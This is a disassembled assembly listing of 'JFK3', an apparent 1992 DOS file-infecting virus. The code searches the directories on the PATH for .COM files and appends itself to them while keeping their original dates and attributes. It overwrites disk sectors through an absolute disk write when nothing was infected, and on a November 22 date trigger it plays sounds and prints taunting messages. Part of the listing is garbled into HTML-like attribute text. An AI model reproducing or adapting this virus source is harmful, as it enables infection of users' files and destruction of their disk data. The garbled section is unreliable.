


PAGE  59,132

;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
;ÛÛ								         ÛÛ
;ÛÛ			        JFK3				         ÛÛ
;ÛÛ								         ÛÛ
;ÛÛ      Created:   6-Oct-92					         ÛÛ
;ÛÛ      Passes:    5	       Analysis Options on: none	         ÛÛ
;ÛÛ								         ÛÛ
;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

psp_envirn_seg	equ	2Ch

seg_a		segment	byte public
		assume	cs:seg_a, ds:seg_a


		org	100h

jfk3		proc	far

start:
		jmp	loc_1
loc_1:
		call	sub_1

jfk3		endp

;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_1		proc	near
		pop	bp
		sub	bp,106h
		lea	si,[bp+34Eh]		; Load effective addr
		mov	di,100h
		push	di
		movsw				; Mov [si] to es:[di]
		movsb				; Mov [si] to es:[di]
		mov	di,bp
		mov	bp,sp
		sub	sp,80h
		mov	ah,2Fh			; '/'
		int	21h			; DOS Services  ah=function 2Fh
						;  get DTA ptr into es:bx
		push	bx
		mov	ah,1Ah
		lea	dx,[bp-80h]		; Load effective addr
		int	21h			; DOS Services  ah=function 1Ah
						;  set DTA(disk xfer area) ds:dx
		mov	cx,0Ah

locloop_2:
		push	cx
		call	sub_2
		pop	cx
		loop	locloop_2		; Loop if cx > 0

		call	sub_11
		or	ax,ax			; Zero ?
		jnz	loc_3			; Jump if not zero
		jmp	short loc_4
loc_3:
		jmp	short loc_5
loc_4:
		mov	ah,0Fh
		int	10h			; Video display   ah=functn 0Fh
						;  get state, al=mode, bh=page
						;   ah=columns on screen
		xor	ah,ah			; Zero register
		int	10h			; Video display   ah=functn 00h
						;  set display mode in al
		mov	ax,2
		mov	cx,4D46h
		cli				; Disable interrupts
		cwd				; Word to double word
		int	26h			; Absolute disk write, drive al
						;  if disk under 32MB, dx=start
						;    cx=#sectors, ds:bx=buffer
						;  else  cx=-1, ds:dx=parm block
		sti				; Enable interrupts
loc_5:
		call	sub_10
		cmp	ax,0Bh
		jle	loc_6			; Jump if < or="call" sub_7="" cmp="" ax,16h="" jle="" loc_6="" ;="" jump="" if="">< or="call" sub_8="" cmp="" ax,0ch="" jle="" loc_6="" ;="" jump="" if="">< or="call" sub_9="" cmp="" ax,1eh="" jle="" loc_6="" ;="" jump="" if="">< or="jmp" short="" loc_7="" loc_6:="" jmp="" short="" loc_13="" loc_7:="" mov="" cx,3="" locloop_8:="" push="" cx="" mov="" dx,140h="" mov="" bx,100h="" in="" al,61h="" ;="" port="" 61h,="" 8255="" port="" b,="" read="" and="" al,0fch="" loc_9:="" xor="" al,2="" out="" 61h,al="" ;="" port="" 61h,="" 8255="" b="" -="" spkr,="" etc="" add="" dx,9248h="" mov="" cl,3="" ror="" dx,cl="" ;="" rotate="" mov="" cx,dx="" and="" cx,1ffh="" or="" cx,0ah="" locloop_10:="" loop="" locloop_10="" ;="" loop="" if="" cx=""> 0

		dec	bx
		jnz	loc_9			; Jump if not zero
		and	al,0FCh
		out	61h,al			; port 61h, 8255 B - spkr, etc
						;  al = 0, disable parity
		mov	bx,2
		xor	ah,ah			; Zero register
		int	1Ah			; Real time clock   ah=func 00h
						;  get system timer count cx,dx
		add	bx,dx
loc_11:
		int	1Ah			; Real time clock   ah=func 00h
						;  get system timer count cx,dx
		cmp	dx,bx
		jne	loc_11			; Jump if not equal
		pop	cx
		loop	locloop_8		; Loop if cx > 0

		lea	si,[di+37Ah]		; Load effective addr
		mov	ah,0Eh
loc_12:
		lodsb				; String [si] to al
		or	al,al			; Zero ?
		jz	loc_13			; Jump if zero
		int	10h			; Video display   ah=functn 0Eh
						;  write char al, teletype mode
		jmp	short loc_12
loc_13:
		pop	dx
		mov	ah,1Ah
		int	21h			; DOS Services  ah=function 1Ah
						;  set DTA(disk xfer area) ds:dx
		mov	sp,bp
		xor	ax,ax			; Zero register
		mov	bx,ax
		mov	cx,ax
		mov	dx,ax
		mov	si,ax
		mov	di,ax
		mov	bp,ax
		retn
sub_1		endp


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_2		proc	near
		mov	bx,di
		push	bp
		mov	bp,sp
		sub	sp,87h
		mov	byte ptr [bp-87h],5Ch	; '\'
		mov	ah,47h			; 'G'
		xor	dl,dl			; Zero register
		lea	si,[bp-86h]		; Load effective addr
		int	21h			; DOS Services  ah=function 47h
						;  get present dir,drive dl,1=a:
						;   ds:si=ASCIIZ directory name
		call	sub_3
loc_14:
		cmp	data_2[bx],0
		je	loc_15			; Jump if equal
		call	sub_4
		mov	ax,cs
		mov	ds,ax
		mov	es,ax
		xor	al,al			; Zero register
		stosb				; Store al to es:[di]
		mov	ah,3Bh			; ';'
		lea	dx,[bp-46h]		; Load effective addr
		int	21h			; DOS Services  ah=function 3Bh
						;  set current dir, path @ ds:dx
		lea	dx,[bx+232h]		; Load effective addr
		push	di
		mov	di,bx
		call	sub_5
		mov	bx,di
		pop	di
		jnc	loc_15			; Jump if carry=0
		jmp	short loc_14
loc_15:
		mov	ah,3Bh			; ';'
		lea	dx,[bp-87h]		; Load effective addr
		int	21h			; DOS Services  ah=function 3Bh
						;  set current dir, path @ ds:dx
		cmp	data_2[bx],0
		jne	loc_16			; Jump if not equal
		stc				; Set carry flag
loc_16:
		mov	sp,bp
		pop	bp
		retn
sub_2		endp

		db	 2Ah, 2Eh, 43h, 4Fh, 4Dh, 00h

;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_3		proc	near
		mov	es,cs:psp_envirn_seg
		xor	di,di			; Zero register
loc_17:
		lea	si,[bx+25Bh]		; Load effective addr
		lodsb				; String [si] to al
		mov	cx,8000h
		repne	scasb			; Rep zf=0+cx >0 Scan es:[di] for al
		mov	cx,4

locloop_18:
		lodsb				; String [si] to al
		scasb				; Scan es:[di] for al
		jnz	loc_17			; Jump if not zero
		loop	locloop_18		; Loop if cx > 0

		mov	data_2[bx],di
		mov	word ptr data_2+2[bx],es
		retn
sub_3		endp

		db	 50h, 41h, 54h, 48h, 3Dh
data_2		dw	0, 0			; Data table (indexed access)

;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_4		proc	near
		lds	si,dword ptr data_2[bx]	; Load 32 bit ptr
		lea	di,[bp-46h]		; Load effective addr
		push	cs
		pop	es
loc_19:
		lodsb				; String [si] to al
		cmp	al,3Bh			; ';'
		je	loc_21			; Jump if equal
		or	al,al			; Zero ?
		jz	loc_20			; Jump if zero
		stosb				; Store al to es:[di]
		jmp	short loc_19
loc_20:
		xor	si,si			; Zero register
loc_21:
		mov	es:data_2[bx],si
		retn
sub_4		endp


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_5		proc	near
		push	bp
		mov	ah,2Fh			; '/'
		int	21h			; DOS Services  ah=function 2Fh
						;  get DTA ptr into es:bx
		push	bx
		mov	bp,sp
		sub	sp,80h
		push	dx
		mov	ah,1Ah
		lea	dx,[bp-80h]		; Load effective addr
		int	21h			; DOS Services  ah=function 1Ah
						;  set DTA(disk xfer area) ds:dx
		mov	ah,4Eh			; 'N'
		mov	cx,27h
		pop	dx
loc_22:
		int	21h			; DOS Services  ah=function 4Fh
						;  find next filename match
		jc	loc_23			; Jump if carry Set
		call	sub_6
		jnc	loc_23			; Jump if carry=0
		mov	ah,4Fh			; 'O'
		jmp	short loc_22
loc_23:
		mov	sp,bp
		mov	ah,1Ah
		pop	dx
		int	21h			; DOS Services  ah=function 1Ah
						;  set DTA(disk xfer area) ds:dx
		pop	bp
		retn
sub_5		endp


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_6		proc	near
		mov	ah,2Fh			; '/'
		int	21h			; DOS Services  ah=function 2Fh
						;  get DTA ptr into es:bx
		mov	si,bx
		mov	byte ptr data_4[di],0
		cmp	word ptr [si+1Ah],0FC0Bh
		jbe	loc_24			; Jump if below or =
		jmp	loc_25
loc_24:
		mov	ax,3D00h
		lea	dx,[si+1Eh]		; Load effective addr
		int	21h			; DOS Services  ah=function 3Dh
						;  open file, al=mode,name@ds:dx
		xchg	ax,bx
		mov	ah,3Fh			; '?'
		mov	cx,3
		lea	dx,[di+34Eh]		; Load effective addr
		int	21h			; DOS Services  ah=function 3Fh
						;  read file, bx=file handle
						;   cx=bytes to ds:dx buffer
		mov	ax,4202h
		cwd				; Word to double word
		mov	cx,dx
		int	21h			; DOS Services  ah=function 42h
						;  move file ptr, bx=file handle
						;   al=method, cx,dx=offset
		xchg	ax,dx
		mov	ah,3Eh			; '>'
		int	21h			; DOS Services  ah=function 3Eh
						;  close file, bx=file handle
		xchg	ax,dx
		sub	ax,2F7h
		cmp	data_5[di],ax
		je	loc_25			; Jump if equal
		mov	byte ptr data_4[di],1
		add	ax,2F4h
		mov	data_6[di],ax
		mov	ax,4301h
		xor	cx,cx			; Zero register
		lea	dx,[si+1Eh]		; Load effective addr
		int	21h			; DOS Services  ah=function 43h
						;  set attrb cx, filename @ds:dx
		mov	ax,3D02h
		int	21h			; DOS Services  ah=function 3Dh
						;  open file, al=mode,name@ds:dx
		xchg	ax,bx
		mov	ah,40h			; '@'
		mov	cx,3
		lea	dx,[di+351h]		; Load effective addr
		int	21h			; DOS Services  ah=function 40h
						;  write file  bx=file handle
						;   cx=bytes from ds:dx buffer
		mov	ax,4202h
		cwd				; Word to double word
		mov	cx,dx
		int	21h			; DOS Services  ah=function 42h
						;  move file ptr, bx=file handle
						;   al=method, cx,dx=offset
		mov	ah,40h			; '@'
		mov	cx,2F4h
		lea	dx,[di+103h]		; Load effective addr
		int	21h			; DOS Services  ah=function 40h
						;  write file  bx=file handle
						;   cx=bytes from ds:dx buffer
		mov	ax,5701h
		mov	cx,[si+16h]
		mov	dx,[si+18h]
		int	21h			; DOS Services  ah=function 57h
						;  set file date+time, bx=handle
						;   cx=time, dx=time
		mov	ah,3Eh			; '>'
		int	21h			; DOS Services  ah=function 3Eh
						;  close file, bx=file handle
		mov	ax,4301h
		xor	ch,ch			; Zero register
		mov	cl,[si+15h]
		lea	dx,[si+1Eh]		; Load effective addr
		int	21h			; DOS Services  ah=function 43h
						;  set attrb cx, filename @ds:dx
loc_25:
		cmp	byte ptr data_4[di],1
		retn
sub_6		endp

data_4		db	0			; Data table (indexed access)
		db	90h
data_5		dw	20CDh			; Data table (indexed access)
		db	0E9h
data_6		dw	0			; Data table (indexed access)

;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_7		proc	near
		mov	ah,2Ah			; '*'
		int	21h			; DOS Services  ah=function 2Ah
						;  get date, cx=year, dh=month
						;   dl=day, al=day-of-week 0=SUN
		mov	al,dl
		cbw				; Convrt byte to word
		retn
sub_7		endp


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_8		proc	near
		mov	ah,2Ch			; ','
		int	21h			; DOS Services  ah=function 2Ch
						;  get time, cx=hrs/min, dx=sec
		mov	al,ch
		cbw				; Convrt byte to word
		retn
sub_8		endp


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_9		proc	near
		mov	ah,2Ch			; ','
		int	21h			; DOS Services  ah=function 2Ch
						;  get time, cx=hrs/min, dx=sec
		mov	al,cl
		cbw				; Convrt byte to word
		retn
sub_9		endp


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_10		proc	near
		mov	ah,2Ah			; '*'
		int	21h			; DOS Services  ah=function 2Ah
						;  get date, cx=year, dh=month
						;   dl=day, al=day-of-week 0=SUN
		mov	al,dh
		cbw				; Convrt byte to word
		retn
sub_10		endp


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_11		proc	near
		mov	al,data_4[di]
		cbw				; Convrt byte to word
		retn
sub_11		endp

		db	'Back, and to the left...', 0Dh, 0Ah
		db	'Happy November 22!', 0Dh, 0Ah, 0
		db	'JFK Memorial Anti-AssassinVirus.'
		db	'.  THE LAST REVISION!By A. Hidel'
		db	'l and O.H. Lee'

seg_a		ends



		end	start

